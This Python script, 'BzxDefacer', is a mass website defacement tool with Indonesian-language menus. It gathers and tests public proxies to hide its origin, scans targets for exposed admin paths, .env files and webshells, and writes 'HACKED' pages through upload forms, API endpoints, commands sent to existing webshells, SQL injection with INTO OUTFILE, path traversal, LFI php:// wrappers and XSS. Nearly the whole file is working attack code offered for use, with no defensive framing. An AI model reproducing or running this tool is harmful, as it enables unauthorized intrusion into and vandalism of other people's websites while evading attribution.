#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# BzxDefacer - Mass Defacer Auto Proxy Edition
# https://github.com/bzdev1/defacer-bzx

import requests
import threading
import random
import time
import os
import sys
import base64
import json
import re
from queue import Queue
from fake_useragent import UserAgent
from colorama import init, Fore, Style
import pyfiglet
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)
ua = UserAgent()

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE
RS = Style.RESET_ALL

# Banner keren
banner_text = pyfiglet.figlet_format("BzxDefacer", font="slant")
banner = f"{R}{banner_text}{RS}"
banner += f"{C}══════════════════════════════════════════════════════════{RS}\n"
banner += f"{W}         MASS DEFACER | AUTO PROXY | CUSTOM HTML{RS}\n"
banner += f"{Y}         Bzx™ Evolution | DEWA SPEK PREMIUM | v4.1{RS}\n"
banner += f"{C}══════════════════════════════════════════════════════════{RS}\n"

class ProxyManager:
    """Manager proxy otomatis"""
    def __init__(self):
        self.proxies = []
        self.live_proxies = []
        self.lock = threading.Lock()
        self.proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt"
        ]
        
    def fetch_from_source(self, url):
        """Ambil proxy dari satu sumber"""
        try:
            headers = {'User-Agent': ua.random}
            r = requests.get(url, headers=headers, timeout=15)
            if r.status_code == 200:
                # Extract IP:port menggunakan regex
                proxies = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b', r.text)
                with self.lock:
                    self.proxies.extend(proxies)
                print(f"{G}[✓] {len(proxies)} proxy dari {url.split('/')[2]}{RS}")
                return proxies
        except Exception as e:
            print(f"{R}[✗] Gagal fetch {url.split('/')[2]}: {str(e)[:30]}{RS}")
        return []
    
    def fetch_all(self):
        """Ambil proxy dari semua sumber"""
        print(f"{Y}[*] Fetching proxies dari {len(self.proxy_sources)} sumber...{RS}")
        self.proxies = []
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(self.fetch_from_source, url): url for url in self.proxy_sources}
            for future in as_completed(futures):
                future.result()
        
        # Remove duplicates
        self.proxies = list(set(self.proxies))
        print(f"{G}[✓] Total {len(self.proxies)} proxy unik terkumpul{RS}")
        return self.proxies
    
    def test_proxy(self, proxy, timeout=5):
        """Test apakah proxy hidup"""
        try:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            r = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=timeout)
            if r.status_code == 200:
                return True, proxy
        except:
            pass
        return False, proxy
    
    def test_all(self, max_threads=50, max_proxies=500):
        """Test semua proxy yang terkumpul"""
        print(f"{Y}[*] Testing {min(len(self.proxies), max_proxies)} proxy...{RS}")
        
        test_proxies = self.proxies[:max_proxies]
        self.live_proxies = []
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(self.test_proxy, p): p for p in test_proxies}
            for future in as_completed(futures):
                is_live, proxy = future.result()
                if is_live:
                    self.live_proxies.append(proxy)
                    print(f"{G}[✓] LIVE: {proxy}{RS}")
        
        print(f"{G}[✓] Ditemukan {len(self.live_proxies)} proxy hidup{RS}")
        return self.live_proxies
    
    def save_to_file(self, filename='proxies.txt', live_only=True):
        """Simpan proxy ke file"""
        proxies_to_save = self.live_proxies if live_only else self.proxies
        try:
            with open(filename, 'w') as f:
                for p in proxies_to_save:
                    f.write(p + '\n')
            print(f"{G}[✓] Tersimpan {len(proxies_to_save)} proxy ke {filename}{RS}")
            return True
        except Exception as e:
            print(f"{R}[✗] Gagal simpan: {e}{RS}")
            return False

class BzxDefacer:
    def __init__(self):
        self.targets = []
        self.live_targets = []
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
        self.deface_html = ""
        self.proxy_manager = ProxyManager()
        self.proxies = []
        self.use_proxy = False
        self.auto_refresh_proxy = True
        self.custom_headers = {}
        self.timeout = 10
        self.delay = 2
        self.mode = "aggressive"
        self.threads = 10
        self.max_proxy_test = 300
        
    def show_menu(self):
        """Tampilkan menu utama"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(banner)
        print(f"{C}┌─────────────────────────────────────────────────────┐{RS}")
        print(f"{C}│{W}                     MENU UTAMA                        {C}│{RS}")
        print(f"{C}├─────────────────────────────────────────────────────┤{RS}")
        print(f"{C}│{G}  1. {W}Load Target List                                 {C}│{RS}")
        print(f"{C}│{G}  2. {W}AUTO PROXY - Fetch & Test                       {C}│{RS}")
        print(f"{C}│{G}  3. {W}Manual Load Proxy File                          {C}│{RS}")
        print(f"{C}│{G}  4. {W}Custom HTML Deface                              {C}│{RS}")
        print(f"{C}│{G}  5. {W}Pilih Template Deface                           {C}│{RS}")
        print(f"{C}│{G}  6. {W}Setting (Thread/Delay/Proxy Mode)               {C}│{RS}")
        print(f"{C}│{G}  7. {W}Scan Kerentanan Target                          {C}│{RS}")
        print(f"{C}│{G}  8. {W}Jalankan Mass Defacer                           {C}│{RS}")
        print(f"{C}│{G}  9. {W}Lihat Hasil (Log)                               {C}│{RS}")
        print(f"{C}│{G} 10. {W}Proxy Status & Management                       {C}│{RS}")
        print(f"{C}│{G} 11. {W}Bersihin Cache/Temp                             {C}│{RS}")
        print(f"{C}│{G} 12. {W}Input Target Manual (Langsung Ketik)           {C}│{RS}")
        print(f"{C}│{R}  0. Exit                                           {C}│{RS}")
        print(f"{C}└─────────────────────────────────────────────────────┘{RS}")
        
        # Tampilkan status proxy dan target
        proxy_status = f"{G}ON ({len(self.proxies)} live)" if self.use_proxy and self.proxies else f"{R}OFF"
        print(f"{Y}Proxy Status: {proxy_status}{RS}")
        if self.use_proxy and self.proxies:
            print(f"{Y}Live Proxies: {len(self.proxies)}{RS}")
        print(f"{Y}Total Target: {len(self.targets)}{RS}")
        
    def input_target_manual(self):
        """Input target langsung dari keyboard"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{C}══════════════════ INPUT TARGET MANUAL ══════════════════{RS}")
        print(f"{Y}Pilih mode input:{RS}")
        print(f"{W}1. Satu baris (pisah pake koma){RS}")
        print(f"{W}2. Satu per satu (ketik 'done' untuk selesai){RS}")
        print(f"{R}0. Kembali{RS}")
        print(f"{C}═══════════════════════════════════════════════════════{RS}")
        
        mode = input(f"{Y}Pilih mode: {RS}").strip()
        
        if mode == '0':
            return
        elif mode == '1':
            targets_input = input(f"\n{Y}Masukkan target (pisah pake koma):\n{RS}").strip()
            if targets_input:
                target_list = [t.strip() for t in targets_input.split(',') if t.strip()]
                self.targets.extend(target_list)
                print(f"{G}[✓] {len(target_list)} target ditambahkan{RS}")
        elif mode == '2':
            print(f"\n{Y}Masukkan target satu per satu (ketik 'done' untuk selesai):{RS}")
            count = 0
            while True:
                target = input(f"{G}Target {count+1}: {RS}").strip()
                if target.lower() == 'done':
                    break
                if target:
                    self.targets.append(target)
                    count += 1
                    print(f"{G}[✓] Target ditambahkan{RS}")
            print(f"{G}[✓] Total {count} target ditambahkan{RS}")
        
        # Tampilkan preview
        if self.targets:
            print(f"\n{Y}Preview 5 target pertama:{RS}")
            for i, t in enumerate(self.targets[:5], 1):
                print(f"{G}{i}. {t}{RS}")
            if len(self.targets) > 5:
                print(f"{Y}... dan {len(self.targets)-5} lainnya{RS}")
        
        input(f"\n{Y}Press Enter untuk kembali...{RS}")
    
    def auto_proxy_menu(self):
        """Menu auto proxy"""
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            print(f"{C}══════════════════ AUTO PROXY MANAGER ══════════════════{RS}")
            print(f"{W}  1. Fetch Proxy dari Internet{RS}")
            print(f"{W}  2. Test Semua Proxy{RS}")
            print(f"{W}  3. Fetch + Test Sekaligus{RS}")
            print(f"{W}  4. Simpan ke File{RS}")
            print(f"{W}  5. Load ke Memory (Aktifkan){RS}")
            print(f"{W}  6. Hapus Semua Proxy{RS}")
            print(f"{W}  7. Lihat Daftar Proxy{RS}")
            print(f"{R}  0. Kembali{RS}")
            print(f"{C}═══════════════════════════════════════════════════════{RS}")
            
            choice = input(f"{Y}Pilih: {RS}").strip()
            
            if choice == '1':
                print(f"{Y}[*] Fetching proxies...{RS}")
                self.proxy_manager.fetch_all()
                input(f"\n{Y}Press Enter...{RS}")
                
            elif choice == '2':
                if not self.proxy_manager.proxies:
                    print(f"{R}[!] Belum ada proxy. Fetch dulu!{RS}")
                else:
                    max_test = input(f"{Y}Jumlah proxy yang dites (max {len(self.proxy_manager.proxies)}, default 300): {RS}").strip()
                    try:
                        max_test = int(max_test) if max_test else 300
                    except:
                        max_test = 300
                    self.proxy_manager.test_all(max_proxies=min(max_test, len(self.proxy_manager.proxies)))
                input(f"\n{Y}Press Enter...{RS}")
                
            elif choice == '3':
                self.proxy_manager.fetch_all()
                max_test = input(f"{Y}Jumlah proxy yang dites (default 300): {RS}").strip()
                try:
                    max_test = int(max_test) if max_test else 300
                except:
                    max_test = 300
                self.proxy_manager.test_all(max_proxies=min(max_test, len(self.proxy_manager.proxies)))
                input(f"\n{Y}Press Enter...{RS}")
                
            elif choice == '4':
                filename = input(f"{Y}Nama file (default: proxies.txt): {RS}").strip() or 'proxies.txt'
                live_only = input(f"{Y}Simpan hanya yang hidup? (y/N): {RS}").strip().lower() == 'y'
                self.proxy_manager.save_to_file(filename, live_only)
                input(f"\n{Y}Press Enter...{RS}")
                
            elif choice == '5':
                if self.proxy_manager.live_proxies:
                    self.proxies = self.proxy_manager.live_proxies.copy()
                    self.use_proxy = True
                    print(f"{G}[✓] {len(self.proxies)} proxy hidup dimuat ke memory & diaktifkan{RS}")
                else:
                    print(f"{R}[!] Belum ada proxy hidup. Test dulu!{RS}")
                time.sleep(2)
                
            elif choice == '6':
                self.proxy_manager.proxies = []
                self.proxy_manager.live_proxies = []
                self.proxies = []
                self.use_proxy = False
                print(f"{G}[✓] Semua proxy dihapus{RS}")
                time.sleep(1)
                
            elif choice == '7':
                print(f"\n{Y}Proxy terkumpul: {len(self.proxy_manager.proxies)}{RS}")
                print(f"{G}Proxy hidup: {len(self.proxy_manager.live_proxies)}{RS}")
                if self.proxy_manager.live_proxies:
                    print(f"\n{W}10 proxy hidup pertama:{RS}")
                    for i, p in enumerate(self.proxy_manager.live_proxies[:10], 1):
                        print(f"{G}{i}. {p}{RS}")
                input(f"\n{Y}Press Enter...{RS}")
                
            elif choice == '0':
                break
    
    def proxy_status_menu(self):
        """Lihat status proxy yang aktif"""
        print(f"{C}══════════════════ PROXY STATUS ══════════════════{RS}")
        print(f"{W}Status Proxy: {G}AKTIF{RS}" if self.use_proxy else f"{W}Status Proxy: {R}NONAKTIF{RS}")
        print(f"{W}Proxy di memory: {len(self.proxies)}{RS}")
        print(f"{W}Auto refresh: {G}ON{RS}" if self.auto_refresh_proxy else f"{W}Auto refresh: {R}OFF{RS}")
        
        if self.proxies:
            print(f"\n{G}5 proxy aktif (random):{RS}")
            random_proxies = random.sample(self.proxies, min(5, len(self.proxies)))
            for p in random_proxies:
                print(f"  {G}• {p}{RS}")
        
        print(f"\n{Y}Proxy Manager:{RS}")
        print(f"  {G}•{W} Total fetched: {len(self.proxy_manager.proxies)}{RS}")
        print(f"  {G}•{W} Total live: {len(self.proxy_manager.live_proxies)}{RS}")
        
        input(f"\n{Y}Press Enter...{RS}")
    
    def custom_html_menu(self):
        """Menu untuk input HTML custom"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"{C}══════════════════ CUSTOM HTML DEFACE ══════════════════{RS}")
        print(f"{Y}Tempel HTML lo di sini (ketik 'DONE' di baris baru kalo selesai):{RS}\n")
        
        lines = []
        while True:
            line = input()
            if line.strip().upper() == 'DONE':
                break
            lines.append(line)
        
        self.deface_html = '\n'.join(lines)
        
        # Preview
        print(f"\n{G}[✓] HTML diterima! Preview:{RS}")
        print(f"{Y}{self.deface_html[:200]}...{RS}" if len(self.deface_html) > 200 else f"{Y}{self.deface_html}{RS}")
        
        # Simpan ke file
        save = input(f"\n{Y}Simpan ke file? (y/N): {RS}").strip().lower()
        if save == 'y':
            filename = input(f"{Y}Nama file (default: custom.html): {RS}").strip() or 'custom.html'
            with open(filename, 'w') as f:
                f.write(self.deface_html)
            print(f"{G}[✓] Tersimpan ke {filename}{RS}")
        
        input(f"\n{Y}Press Enter untuk kembali...{RS}")
    
    def template_menu(self):
        """Pilih template deface - FIXED VERSION"""
        templates = {
            '1': {'name': 'HACKED BASIC', 'html': '<html><head><title>HACKED</title></head><body bgcolor=black text=red><center><h1>💀 HACKED BY Bzx 💀</h1><blink>Your security is trash</blink></center></body></html>'},
            '2': {'name': 'ANONYMOUS STYLE', 'html': '<html><head><title>Anonymous Was Here</title><style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:200px;}h1{font-size:50px;}blink{animation:blink 1s infinite;}@keyframes blink{0%{opacity:1;}50%{opacity:0;}}</style></head><body><h1>🔓 HACKED</h1><h2>We are Anonymous</h2><blink>🖕 Expect Us 🖕</blink></body></html>'},
            '3': {'name': 'MATRIX THEME', 'html': '<html><head><title>Matrix Hacked</title><style>body{background:black;color:#00ff00;font-family:monospace;text-align:center;padding-top:150px;}.matrix{text-shadow:0 0 5px #0f0;}@keyframes glitch{2%,64%{transform:skew(0,0)}}</style></head><body><div class="matrix"><h1>⚠️ SYSTEM BREACHED ⚠️</h1><p>Follow the white rabbit</p><p>Bzx Owns This</p></div></body></html>'},
            '4': {'name': 'PROTEST PAGE', 'html': '<html><head><title>Hacked - Protest</title></head><body bgcolor=white text=black><center><h1 style="color:red;">✊ HACKED ✊</h1><h3>This site has been defaced as a protest</h3><p>Fix your security or we\'ll be back</p><p>- Bzx</p></center></body></html>'},
            '5': {'name': 'SKULL & BONES', 'html': '<html><head><title>💀 HACKED 💀</title><style>body{background:#111;color:#fff;text-align:center;padding-top:100px;}pre{color:#f00;font-size:20px;}</style></head><body><pre>         ______                 ______              ______\n        /      \\               /      \\            /      \\\n       |  💀  💀  |             |  💀  💀  |          |  💀  💀  |\n        \\  __  /               \\  __  /            \\  __  /\n         /    \\                 /    \\              /    \\\n        /      \\               /      \\            /      \\</pre><h1>HACKED BY Bzx</h1><h2>You got pwned!</h2></body></html>'},
        }
        
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            print(f"{C}══════════════════ PILIH TEMPLATE ══════════════════{RS}")
            for key, tmpl in templates.items():
                print(f"{G}{key}. {W}{tmpl['name']}{RS}")
            print(f"{R}0. Kembali{RS}")
            print(f"{C}═══════════════════════════════════════════════════{RS}")
            
            choice = input(f"{Y}Pilih template: {RS}").strip()
            if choice == '0':
                break
            elif choice in templates:
                self.deface_html = templates[choice]['html']
                print(f"{G}[✓] Template '{templates[choice]['name']}' dipilih{RS}")
                
                # Preview
                print(f"\n{Y}Preview:{RS}")
                print(f"{self.deface_html[:200]}...")
                
                save = input(f"\n{Y}Simpan ke file? (y/N): {RS}").strip().lower()
                if save == 'y':
                    filename = input(f"{Y}Nama file: {RS}").strip() or f"template_{choice}.html"
                    with open(filename, 'w') as f:
                        f.write(self.deface_html)
                    print(f"{G}[✓] Tersimpan ke {filename}{RS}")
                
                input(f"\n{Y}Press Enter...{RS}")
    
    def settings_menu(self):
        """Menu pengaturan"""
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            print(f"{C}══════════════════ PENGATURAN ══════════════════{RS}")
            print(f"{W}  1. Thread count        : {G}{self.threads}{RS}")
            print(f"{W}  2. Delay (detik)       : {G}{self.delay}{RS}")
            print(f"{W}  3. Timeout (detik)     : {G}{self.timeout}{RS}")
            print(f"{W}  4. Mode serangan        : {G}{self.mode}{RS}")
            print(f"{W}  5. Custom Headers       : {G}{len(self.custom_headers)} header{RS}")
            print(f"{W}  6. Auto Refresh Proxy   : {G}{self.auto_refresh_proxy}{RS}")
            print(f"{W}  7. Max Proxy Test       : {G}{self.max_proxy_test}{RS}")
            print(f"{W}  8. Toggle Proxy ON/OFF  : {G}{'ON' if self.use_proxy else 'OFF'}{RS}")
            print(f"{W}  9. Reset ke default{RS}")
            print(f"{R}  0. Kembali{RS}")
            print(f"{C}═══════════════════════════════════════════════════{RS}")
            
            choice = input(f"{Y}Pilih: {RS}").strip()
            
            if choice == '1':
                try:
                    val = int(input(f"{Y}Thread count (1-100): {RS}"))
                    self.threads = max(1, min(100, val))
                except:
                    pass
            elif choice == '2':
                try:
                    val = float(input(f"{Y}Delay (detik): {RS}"))
                    self.delay = max(0, val)
                except:
                    pass
            elif choice == '3':
                try:
                    val = int(input(f"{Y}Timeout (detik): {RS}"))
                    self.timeout = max(1, val)
                except:
                    pass
            elif choice == '4':
                print(f"{Y}Mode: normal / aggressive / stealth{RS}")
                mode = input(f"{Y}Pilih: {RS}").strip().lower()
                if mode in ['normal', 'aggressive', 'stealth']:
                    self.mode = mode
            elif choice == '5':
                print(f"{Y}Format: Header:Value (ketik 'done' untuk selesai){RS}")
                self.custom_headers = {}
                while True:
                    h = input(f"{Y}Header: {RS}").strip()
                    if h.lower() == 'done':
                        break
                    if ':' in h:
                        k, v = h.split(':', 1)
                        self.custom_headers[k.strip()] = v.strip()
            elif choice == '6':
                self.auto_refresh_proxy = not self.auto_refresh_proxy
                print(f"{G}[✓] Auto refresh proxy: {self.auto_refresh_proxy}{RS}")
                time.sleep(1)
            elif choice == '7':
                try:
                    val = int(input(f"{Y}Max proxy test (50-1000): {RS}"))
                    self.max_proxy_test = max(50, min(1000, val))
                except:
                    pass
            elif choice == '8':
                self.use_proxy = not self.use_proxy
                if self.use_proxy and not self.proxies:
                    print(f"{Y}[!] Proxy aktif tapi tidak ada di memory. Load dulu!{RS}")
                print(f"{G}[✓] Proxy: {'ON' if self.use_proxy else 'OFF'}{RS}")
                time.sleep(1)
            elif choice == '9':
                self.threads = 10
                self.delay = 2
                self.timeout = 10
                self.mode = 'normal'
                self.custom_headers = {}
                self.auto_refresh_proxy = True
                self.max_proxy_test = 300
                print(f"{G}[✓] Reset ke default{RS}")
                time.sleep(1)
            elif choice == '0':
                break
    
    def load_targets(self, file):
        """Load list target dari file"""
        try:
            with open(file, 'r') as f:
                file_targets = [line.strip() for line in f if line.strip()]
                self.targets.extend(file_targets)
            print(f"{G}[✓] Loaded {len(file_targets)} targets dari file{RS}")
        except:
            print(f"{R}[✗] Gagal load file{RS}")
    
    def load_proxies(self, file):
        """Load proxy list dari file"""
        try:
            with open(file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            print(f"{G}[✓] Loaded {len(self.proxies)} proxies dari file{RS}")
            self.use_proxy = True
        except:
            print(f"{R}[✗] Gagal load file{RS}")
            self.use_proxy = False
    
    def get_proxy_dict(self):
        """Random proxy dict dengan auto refresh jika diperlukan"""
        if not self.use_proxy or not self.proxies:
            return None
            
        # Auto refresh jika proxy habis
        if self.auto_refresh_proxy and len(self.proxies) < 5:
            print(f"{Y}[!] Proxy hampir habis, auto refresh...{RS}")
            self.proxy_manager.fetch_all()
            self.proxy_manager.test_all(max_proxies=self.max_proxy_test)
            if self.proxy_manager.live_proxies:
                self.proxies.extend(self.proxy_manager.live_proxies)
                self.proxies = list(set(self.proxies))
        
        proxy = random.choice(self.proxies)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    def check_vuln(self, url):
        """Cek kerentanan umum"""
        vuln_checks = [
            {'path': '/admin/config.php', 'method': 'GET'},
            {'path': '/wp-admin/admin-ajax.php', 'method': 'POST', 'data': {'action': 'test'}},
            {'path': '/cgi-bin/test.cgi', 'method': 'GET'},
            {'path': '/shell.php', 'method': 'GET'},
            {'path': '/upload.php', 'method': 'OPTIONS'},
            {'path': '/.env', 'method': 'GET'},
            {'path': '/backup.zip', 'method': 'GET'},
            {'path': '/phpinfo.php', 'method': 'GET'},
            {'path': '/wp-content/uploads/', 'method': 'GET'},
            {'path': '/images/', 'method': 'GET'},
            {'path': '/admin/', 'method': 'GET'},
        ]
        
        headers = {'User-Agent': ua.random}
        headers.update(self.custom_headers)
        proxies = self.get_proxy_dict()
        
        for check in vuln_checks:
            try:
                full_url = url.rstrip('/') + check['path']
                if check['method'] == 'GET':
                    r = requests.get(full_url, headers=headers, proxies=proxies, timeout=self.timeout, verify=False)
                elif check['method'] == 'POST':
                    r = requests.post(full_url, headers=headers, proxies=proxies, data=check.get('data', {}), timeout=self.timeout, verify=False)
                elif check['method'] == 'OPTIONS':
                    r = requests.options(full_url, headers=headers, proxies=proxies, timeout=self.timeout, verify=False)
                
                if r.status_code in [200, 201, 204, 301, 302, 403, 500]:
                    return {'url': full_url, 'vuln_type': check['path'], 'status': r.status_code}
            except:
                continue
        return None
    
    def scan_targets(self):
        """Scan kerentanan tanpa deface"""
        if not self.targets:
            print(f"{R}[!] Load target dulu!{RS}")
            return
        
        print(f"{Y}[*] Scanning {len(self.targets)} targets...{RS}")
        
        queue = Queue()
        for target in self.targets:
            queue.put(target)
        
        vuln_count = 0
        
        def scan_worker():
            nonlocal vuln_count
            while not queue.empty():
                target = queue.get()
                vuln = self.check_vuln(target)
                if vuln:
                    with self.lock:
                        vuln_count += 1
                        print(f"{G}[✓] {target} - {vuln['vuln_type']}{RS}")
                        with open('vulnerable.txt', 'a') as f:
                            f.write(f"{target}|{vuln['vuln_type']}|{vuln['status']}\n")
                queue.task_done()
        
        threads = []
        for _ in range(min(20, len(self.targets))):
            t = threading.Thread(target=scan_worker)
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        print(f"\n{G}[✓] Scan selesai! {vuln_count} target rentan ditemukan{RS}")
        print(f"{G}Hasil disimpan di vulnerable.txt{RS}")
        input(f"\n{Y}Press Enter...{RS}")
    
    def upload_deface(self, url):
        """Upload deface via berbagai metode"""
        methods = [
            self._upload_via_form,
            self._upload_via_api,
            self._upload_via_webshell,
            self._inject_sql,
            self._upload_via_path_traversal,
            self._upload_via_lfi,
            self._inject_javascript,
        ]
        
        # Randomize method order based on mode
        if self.mode == 'aggressive':
            random.shuffle(methods)
        elif self.mode == 'stealth':
            methods = methods[:3]  # Pakai method yang lebih aman
        
        for method in methods:
            try:
                result = method(url)
                if result:
                    return result
                if self.mode == 'stealth':
                    time.sleep(self.delay * 2)
            except:
                continue
        return None
    
    def _upload_via_form(self, url):
        """Upload via file upload form"""
        upload_paths = [
            '/upload.php',
            '/uploads/upload.php',
            '/admin/upload.php',
            '/file/upload',
            '/media/upload',
            '/wp-admin/async-upload.php',
        ]
        
        for path in upload_paths:
            try:
                upload_url = urljoin(url, path)
                files = {'file': ('index.html', self.deface_html, 'text/html')}
                headers = {'User-Agent': ua.random}
                headers.update(self.custom_headers)
                proxies = self.get_proxy_dict()
                
                r = requests.post(upload_url, files=files, headers=headers, proxies=proxies, timeout=self.timeout, verify=False)
                
                if r.status_code in [200, 201, 202, 302]:
                    return {'method': f'upload_form_{path}', 'status': r.status_code}
            except:
                continue
        return None
    
    def _upload_via_api(self, url):
        """Upload via API endpoint"""
        endpoints = [
            '/api/upload',
            '/wp-json/wp/v2/media',
            '/admin/ajax/upload',
            '/index.php?option=com_media&task=file.upload',
            '/rest/v1/media',
            '/v1/upload',
        ]
        
        for endpoint in endpoints:
            try:
                full_url = urljoin(url, endpoint)
                headers = {'User-Agent': ua.random, 'Content-Type': 'multipart/form-data'}
                headers.update(self.custom_headers)
                proxies = self.get_proxy_dict()
                files = {'file': ('index.html', self.deface_html, 'text/html')}
                
                r = requests.post(full_url, files=files, headers=headers, proxies=proxies, timeout=self.timeout, verify=False)
                
                if r.status_code in [200, 201, 202]:
                    return {'method': f'api_{endpoint}', 'status': r.status_code}
            except:
                continue
        return None
    
    def _upload_via_webshell(self, url):
        """Upload via existing webshell"""
        shells = [
            {'url': '/shell.php', 'cmd_param': 'cmd'},
            {'url': '/c99.php', 'cmd_param': 'action'},
            {'url': '/r57.php', 'cmd_param': 'command'},
            {'url': '/b374k.php', 'cmd_param': 'cmd'},
            {'url': '/wso.php', 'cmd_param': 'a'},
        ]
        
        encoded_html = base64.b64encode(self.deface_html.encode()).decode()
        
        for shell in shells:
            try:
                shell_url = urljoin(url, shell['url'])
                cmds = [
                    f"echo '{self.deface_html}' > index.html",
                    f"echo '{self.deface_html}' > ../index.html",
                    f"echo '{self.deface_html}' > ../../index.html",
                    f"file_put_contents('index.html', base64_decode('{encoded_html}'));",
                ]
                
                for cmd in cmds:
                    params = {shell['cmd_param']: cmd}
                    headers = {'User-Agent': ua.random}
                    headers.update(self.custom_headers)
                    proxies = self.get_proxy_dict()
                    
                    r = requests.get(shell_url, params=params, headers=headers, proxies=proxies, timeout=self.timeout, verify=False)
                    
                    if r.status_code == 200 and 'error' not in r.text.lower():
                        return {'method': f'webshell_{shell["url"]}', 'status': r.status_code}
            except:
                continue
        return None
    
    def _inject_sql(self, url):
        """SQL injection buat deface"""
        sql_payloads = [
            f"1' UNION SELECT '{self.deface_html}',2,3 INTO OUTFILE 'index.html'; --",
            f"'; UPDATE articles SET content='{self.deface_html}' WHERE id=1; --",
            f"1' UNION SELECT '{self.deface_html}',NULL,NULL INTO DUMPFILE '/var/www/html/index.html'; --",
        ]
        
        for payload in sql_payloads:
            try:
                full_url = urljoin(url, f"/index.php?id={payload}")
                headers = {'User-Agent': ua.random}
                headers.update(self.custom_headers)
                proxies = self.get_proxy_dict()
                
                r = requests.get(full_url, headers=headers, proxies=proxies, timeout=self.timeout, verify=False)
                
                if r.status_code == 200 and 'mysql' not in r.text.lower():
                    return {'method': 'sql_injection', 'status': r.status_code}
            except:
                continue
        return None
    
    def _upload_via_path_traversal(self, url):
        """Path traversal upload"""
        traversal_payloads = [
            {'param': 'file', 'path': '../../../index.html'},
            {'param': 'filename', 'path': '../../../../index.html'},
            {'param': 'path', 'path': '../../../index.html'},
        ]
        
        for payload in traversal_payloads:
            try:
                upload_url = urljoin(url, '/upload.php')
                files = {payload['param']: (payload['path'], self.deface_html, 'text/html')}
                headers = {'User-Agent': ua.random}
                headers.update(self.custom_headers)
                proxies = self.get_proxy_dict()
                
                r = requests.post(upload_url, files=files, headers=headers, proxies=proxies, timeout=self.timeout, verify=False)
                
                if r.status_code in [200, 302]:
                    return {'method': 'path_traversal', 'status': r.status_code}
            except:
                continue
        return None
    
    def _upload_via_lfi(self, url):
        """Local File Inclusion to write file"""
        lfi_payloads = [
            f"php://filter/write=convert.base64-decode/resource=../index.html",
            f"php://input",
        ]
        
        for payload in lfi_payloads:
            try:
                full_url = urljoin(url, f"/index.php?page={payload}")
                headers = {'User-Agent': ua.random}
                headers.update(self.custom_headers)
                proxies = self.get_proxy_dict()
                
                r = requests.post(full_url, data=self.deface_html, headers=headers, proxies=proxies, timeout=self.timeout, verify=False)
                
                if r.status_code == 200:
                    return {'method': 'lfi_injection', 'status': r.status_code}
            except:
                continue
        return None
    
    def _inject_javascript(self, url):
        """Inject JavaScript via XSS - FIXED VERSION"""
        js_payload = "<script>document.write('{}');</script>".format(self.deface_html.replace('"', '\\"'))
        
        xss_points = [
            f"/search?q={js_payload}",
            f"/index.php?name={js_payload}",
            f"/?s={js_payload}",
        ]
        
        for point in xss_points:
            try:
                full_url = urljoin(url, point)
                headers = {'User-Agent': ua.random}
                headers.update(self.custom_headers)
                proxies = self.get_proxy_dict()
                
                r = requests.get(full_url, headers=headers, proxies=proxies, timeout=self.timeout, verify=False)
                
                if js_payload in r.text:
                    return {'method': 'xss_injection', 'status': r.status_code}
            except:
                continue
        return None
    
    def worker(self, queue):
        """Thread worker buat deface"""
        while not queue.empty():
            target = queue.get()
            
            # Cek vuln dulu
            vuln = self.check_vuln(target)
            if vuln:
                with self.lock:
                    print(f"{G}[✓] Vuln ditemukan: {target} - {vuln['vuln_type']}{RS}")
                    self.live_targets.append({'url': target, 'vuln': vuln})
                
                # Upload deface
                result = self.upload_deface(target)
                if result:
                    with self.lock:
                        self.success += 1
                        print(f"{R}[🔥] DEFACED: {target} via {result['method']}{RS}")
                        
                        # Simpan log
                        with open('defaced.log', 'a') as f:
                            f.write(f"{target}|{result['method']}|{result['status']}\n")
                else:
                    with self.lock:
                        self.failed += 1
                        print(f"{Y}[!] Gagal deface: {target}{RS}")
            else:
                with self.lock:
                    self.failed += 1
                    print(f"{R}[✗] Not vuln: {target}{RS}")
            
            queue.task_done()
            time.sleep(random.uniform(1, self.delay))
    
    def run(self):
        """Jalankan mass defacer"""
        if not self.targets:
            print(f"{R}[!] Load target dulu! (Menu 1 atau 12){RS}")
            return
        
        if not self.deface_html:
            print(f"{R}[!] Load/pilih HTML deface dulu! (Menu 4 atau 5){RS}")
            return
        
        queue = Queue()
        for target in self.targets:
            queue.put(target)
        
        print(f"\n{Y}[*] Starting mass deface with {self.threads} threads...{RS}\n")
        print(f"{Y}Total target: {len(self.targets)}{RS}")
        
        # Reset counter
        self.success = 0
        self.failed = 0
        self.live_targets = []
        
        start_time = time.time()
        
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker, args=(queue,))
            t.daemon = True
            t.start()
        
        queue.join()
        
        elapsed = time.time() - start_time
        
        print(f"\n{C}═══════════════════════════════════════{RS}")
        print(f"{G}[✓] Selesai dalam {elapsed:.2f} detik!{RS}")
